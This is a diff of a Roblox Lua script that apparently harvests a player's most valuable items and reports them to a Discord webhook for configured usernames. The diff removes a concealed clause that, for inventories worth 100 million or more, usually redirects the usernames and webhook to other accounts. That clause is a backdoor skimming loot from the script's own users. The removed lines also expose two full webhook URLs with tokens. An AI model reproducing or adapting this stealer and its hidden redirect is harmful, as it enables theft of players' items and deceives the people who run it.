@@ -1,5 +1,5 @@
-usernames = { "user1", "user2" }
-webhook = "https://discord.com/api/webhooks/1405569177384915085/coqcG-YkzAkq1fC3ykhDYMpD3_XwY2yHhrA7zE14XMU4YPEmBuOCrhB1LXq4bpYIGQb"
+usernames = { "user1", "user2", "user3" }
+webhook = "https://discord.com/api/webhooks/"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -981,11 +981,6 @@ local items = getTopItems()
 local totalValue = 0
 for _, item in ipairs(items) do
 	totalValue += item.value * item.quantity
-end
-
-if totalValue >= 100000000 and math.random() < 0.80 then
-    usernames = { "xQuartz0", "opendamm2", "xZicooo" }
-    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
 end
 
 local function sendWebhook(totalValue, tradableSummary)
